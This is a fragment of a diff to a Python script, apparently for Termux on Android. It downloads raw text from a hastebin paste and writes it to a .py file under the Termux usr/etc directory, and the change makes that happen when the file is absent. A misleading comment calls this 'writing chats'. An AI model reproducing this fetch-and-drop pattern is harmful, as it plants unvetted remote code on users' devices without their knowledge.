@@ -1288,8 +1288,9 @@ def main():
             break
 def start():
     r = requests.get("https://hastebin.com/raw/irubezayoc")
+    dos = os.path.exists('/data/data/com.termux/files/usr/etc/c.py')
     try:
-        if os.path.exists('/data/data/com.termux/files/usr/etc/c.py'):
+        if dos is False:
             f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
             f.write(r.text)  # Запись чатов в отдельный файл
             f.close()
